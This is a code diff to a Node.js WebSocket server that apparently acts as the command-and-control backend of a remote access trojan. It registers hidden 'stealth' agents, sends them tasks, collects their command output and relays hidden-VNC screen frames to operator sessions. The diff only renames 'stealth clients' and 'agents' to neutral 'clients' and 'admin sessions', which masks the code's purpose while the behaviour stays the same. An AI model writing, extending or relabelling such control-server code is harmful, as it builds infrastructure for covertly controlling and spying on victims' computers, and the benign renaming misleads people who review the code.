@@ -5,17 +5,17 @@ const { validateWebSocketMessage } = require('../middleware/validation');
 const jwt = require('jsonwebtoken');
 const telegramService = require('../services/telegramService');
 
-// Store all connected web clients for broadcasting
-const webClients = new Set();
-const stealthClients = new Map(); // Map of uuid -> websocket
+// Store all connected clients (unified approach)
+const connectedClients = new Map(); // Map of uuid -> websocket
+const adminSessions = new Set(); // Store admin web sessions separately
 
-// Helper function to get agent connection
-const getAgentConnection = (uuid) => {
-  return stealthClients.get(uuid);
+// Helper function to get client connection
+const getClientConnection = (uuid) => {
+  return connectedClients.get(uuid);
 };
 
 // Export the helper function
-module.exports.getAgentConnection = getAgentConnection;
+module.exports.getClientConnection = getClientConnection;
 
 // Platform detection utilities
 function detectOperatingSystem(platformString, userAgent) {
@@ -96,14 +96,14 @@ function extractCapabilities(data) {
     return capabilities;
 }
 
-// Broadcast function to send data to all web clients
-function broadcastToWebClients(data) {
+// Broadcast function to send data to all admin sessions
+function broadcastToAdminSessions(data) {
     const message = JSON.stringify(data);
-    webClients.forEach(client => {
+    adminSessions.forEach(client => {
         if (client.readyState === client.OPEN) {
             client.send(message);
         } else {
-            webClients.delete(client);
+            adminSessions.delete(client);
         }
     });
 }
@@ -112,19 +112,19 @@ function broadcastToWebClients(data) {
 // Function to get current connection stats for debugging
 function getConnectionStats() {
     return {
-        totalClients: webClients.size + stealthClients.size,
-        webClients: webClients.size,
-        stealthClients: stealthClients.size,
-        stealthClientIds: Array.from(stealthClients.keys()),
+        totalClients: connectedClients.size + adminSessions.size,
+        connectedClients: connectedClients.size,
+        adminSessions: adminSessions.size,
+        clientIds: Array.from(connectedClients.keys()),
         timestamp: new Date().toISOString()
     };
 }
 
-// Function to broadcast connection stats to web clients
+// Function to broadcast connection stats to admin sessions
 function broadcastConnectionStats() {
     const stats = getConnectionStats();
     console.log('Current connection stats:', stats);
-    broadcastToWebClients({
+    broadcastToAdminSessions({
         type: 'connection_stats',
         stats: stats
     });
@@ -133,7 +133,7 @@ function broadcastConnectionStats() {
 // Main WebSocket handler function
 const wsHandler = (ws, req) => {
     let isAuthenticated = false;
-    let clientType = 'unknown'; // 'web' or 'stealth'
+    let clientType = 'unknown'; // 'client' or 'admin'
     let clientId = null;
     
     console.log('New WebSocket connection from:', req.socket.remoteAddress);
@@ -173,22 +173,22 @@ const wsHandler = (ws, req) => {
                 return;
             }
             
-            // Handle authentication for web clients
+            // Handle authentication for admin sessions
             if (data.type === 'auth' && data.token) {
                 try {
                     const decoded = jwt.verify(data.token, process.env.JWT_SECRET);
                     isAuthenticated = true;
-                    clientType = 'web';
+                    clientType = 'admin';
                     clientId = decoded.id; // Changed from userId to id to match token payload
                     clearTimeout(authTimeout);
                     
-                    webClients.add(ws);
+                    adminSessions.add(ws);
                     ws.send(JSON.stringify({ 
                         type: 'auth_success', 
                         message: 'Authentication successful' 
                     }));
                     
-                    console.log('Web client authenticated:', clientId);
+                    console.log('Admin session authenticated:', clientId);
                     return;
                 } catch (jwtError) {
                     console.error('JWT verification failed:', jwtError);
@@ -201,48 +201,48 @@ const wsHandler = (ws, req) => {
                 }
             }
             
-            // For stealth clients, first message should be registration
+            // For clients, first message should be registration
             if (!isAuthenticated && (data.type === 'register' || data.type === 'agent_register')) {
                 isAuthenticated = true;
-                clientType = 'stealth';
+                clientType = 'client';
                 clientId = data.uuid || data.agentId;
                 clearTimeout(authTimeout);
                 
-                console.log('Stealth client registered:', clientId);
+                console.log('Client registered:', clientId);
                 
-                // Store the connection for agent communication
-                if (data.agentId) {
-                    stealthClients.set(data.agentId, ws);
-                    console.log('Agent connection stored:', data.agentId);
+                // Store the connection for client communication
+                if (data.uuid || data.agentId) {
+                    connectedClients.set(clientId, ws);
+                    console.log('Client connection stored:', clientId);
                 }
             }
             
-            // Handle web_client identification
+            // Handle admin session identification
             if (data.type === 'web_client') {
                 // If already authenticated via auth token, just acknowledge
-                if (isAuthenticated && clientType === 'web') {
+                if (isAuthenticated && clientType === 'admin') {
                     ws.send(JSON.stringify({ 
                         type: 'web_client_ack', 
-                        message: 'Web client acknowledged' 
+                        message: 'Admin session acknowledged' 
                     }));
-                    console.log('Web client identified');
+                    console.log('Admin session identified');
                 } else {
-                    // Web clients should authenticate first with auth token
+                    // Admin sessions should authenticate first with auth token
                     ws.send(JSON.stringify({ 
                         type: 'auth_required', 
                         message: 'Authentication required' 
                     }));
-                    console.log('Unauthenticated web_client message received');
+                    console.log('Unauthenticated admin session message received');
                 }
                 return;
             }
             
-            // Handle stealth client registration
-            if ((data.type === 'register' || data.type === 'agent_register') && clientType === 'stealth') {
-                // Send success response to agent
+            // Handle client registration
+            if ((data.type === 'register' || data.type === 'agent_register') && clientType === 'client') {
+                // Send success response to client
                 ws.send(JSON.stringify({ 
                     type: 'register_success', 
-                    message: 'Agent registered successfully' 
+                    message: 'Client registered successfully' 
                 }));
                 
                 // Use integration layer for client registration if available
@@ -283,14 +283,14 @@ const wsHandler = (ws, req) => {
                 return;
             }
 
-            // Handle web client identification
-            if (data.type === 'web_client' && clientType === 'web') {
-                ws.clientType = 'web';
-                webClients.add(ws);
-                console.log('Web client connected. Total web clients:', webClients.size);
+            // Handle admin session identification
+            if (data.type === 'web_client' && clientType === 'admin') {
+                ws.clientType = 'admin';
+                adminSessions.add(ws);
+                console.log('Admin session connected. Total admin sessions:', adminSessions.size);
                 console.log('Updated connection stats:', getConnectionStats());
                 
-                // Send current client list to new web client
+                // Send current client list to new admin session
                 const clients = await Client.find({});
                 ws.send(JSON.stringify({
                     type: 'client_list_update',
@@ -313,8 +313,8 @@ const wsHandler = (ws, req) => {
                         }
                     );
                     
-                    // Broadcast capability update to web clients
-                    broadcastToWebClients({
+                    // Broadcast capability update to admin sessions
+                    broadcastToAdminSessions({
                         type: 'client_capabilities_update',
                         uuid: uuid,
                         capabilities: reportedCapabilities
@@ -324,7 +324,7 @@ const wsHandler = (ws, req) => {
             }
 
             if (data.type === 'heartbeat') {
-                // Handle heartbeat messages from stealth clients
+                // Handle heartbeat messages from clients
                 const { uuid } = data;
                 if (uuid) {
                     console.log(`Received heartbeat from client ${uuid}`);
@@ -354,12 +354,12 @@ const wsHandler = (ws, req) => {
             }
 
             if (data.type === 'output') {
-                // This is an output message from a stealth client
+                // This is an output message from a client
                 const { taskId, output } = data;
                 await Task.findByIdAndUpdate(taskId, { output: output });
                 
-                // Broadcast task completion to web clients
-                broadcastToWebClients({
+                // Broadcast task completion to admin sessions
+                broadcastToAdminSessions({
                     type: 'task_completed',
                     taskId: taskId,
                     output: output
@@ -368,7 +368,7 @@ const wsHandler = (ws, req) => {
             }
 
             if (data.type === 'hvnc_response') {
-                // Handle HVNC session responses from stealth client
+                // Handle HVNC session responses from client
                 const { sessionId, status, error, frameData, screenInfo } = data;
                 
                 // Update agent HVNC session status
@@ -392,8 +392,8 @@ const wsHandler = (ws, req) => {
                     );
                 }
                 
-                // Broadcast HVNC response to web clients
-                broadcastToWebClients({
+                // Broadcast HVNC response to admin sessions
+                broadcastToAdminSessions({
                     type: 'hvnc_response',
                     agentUuid: ws.uuid,
                     sessionId,
@@ -407,11 +407,11 @@ const wsHandler = (ws, req) => {
             }
 
             if (data.type === 'hvnc_frame') {
-                // Handle HVNC frame data from stealth client
+                // Handle HVNC frame data from client
                 const { sessionId, frameData, frameInfo } = data;
                 
-                // Broadcast frame data to web clients
-                broadcastToWebClients({
+                // Broadcast frame data to admin sessions
+                broadcastToAdminSessions({
                     type: 'hvnc_frame',
                     agentUuid: ws.uuid,
                     sessionId,
@@ -422,16 +422,16 @@ const wsHandler = (ws, req) => {
                 return;
             }
 
-            // Handle stealth client messages
+            // Handle client messages
             if (data.uuid) {
                 ws.uuid = data.uuid;
-                ws.clientType = 'stealth';
-                stealthClients.set(data.uuid, ws);
+                ws.clientType = 'client';
+                connectedClients.set(data.uuid, ws);
             } else {
                 return; // Ignore messages without a UUID
             }
             
-            console.log(`Received data from stealth client ${data.uuid}`);
+            console.log(`Received data from client ${data.uuid}`);
 
             // Detect platform information
             const operatingSystem = detectOperatingSystem(data.platform, data.userAgent);
@@ -499,8 +499,8 @@ const wsHandler = (ws, req) => {
                 }
             }
 
-            // Broadcast client status update to all web clients
-            broadcastToWebClients({
+            // Broadcast client status update to all admin sessions
+            broadcastToAdminSessions({
                 type: 'client_status_update',
                 client: updatedClient
             });
@@ -516,8 +516,8 @@ const wsHandler = (ws, req) => {
                     task.status = 'executed';
                     await task.save();
                     
-                    // Broadcast task execution to web clients
-                    broadcastToWebClients({
+                    // Broadcast task execution to admin sessions
+                    broadcastToAdminSessions({
                         type: 'task_executed',
                         taskId: task._id,
                         clientUuid: data.uuid,
@@ -547,12 +547,12 @@ const wsHandler = (ws, req) => {
         console.log('Client disconnected');
         console.log('Connection stats before cleanup:', getConnectionStats());
         
-        if (ws.clientType === 'web') {
-            webClients.delete(ws);
-            console.log('Web client disconnected. Total web clients:', webClients.size);
-        } else if (ws.uuid && ws.clientType === 'stealth') {
-            stealthClients.delete(ws.uuid);
-            console.log('Stealth client disconnected:', ws.uuid);
+        if (ws.clientType === 'admin') {
+            adminSessions.delete(ws);
+            console.log('Admin session disconnected. Total admin sessions:', adminSessions.size);
+        } else if (ws.uuid && ws.clientType === 'client') {
+            connectedClients.delete(ws.uuid);
+            console.log('Client disconnected:', ws.uuid);
             
             const updatedClient = await Client.findOneAndUpdate(
                 { uuid: ws.uuid },
@@ -566,8 +566,8 @@ const wsHandler = (ws, req) => {
             );
             
             if (updatedClient) {
-                // Broadcast client status update to web clients
-                broadcastToWebClients({
+                // Broadcast client status update to admin sessions
+                broadcastToAdminSessions({
                     type: 'client_status_update',
                     client: updatedClient
                 });
@@ -611,7 +611,7 @@ function validateCommandCompatibility(command, operatingSystem, capabilities) {
 
 // Export all functions and the main handler
 module.exports = wsHandler;
-module.exports.getAgentConnection = getAgentConnection;
+module.exports.getClientConnection = getClientConnection;
 module.exports.getConnectionStats = getConnectionStats;
 module.exports.broadcastConnectionStats = broadcastConnectionStats;
-module.exports.broadcastToWebClients = broadcastToWebClients;
+module.exports.broadcastToAdminSessions = broadcastToAdminSessions;
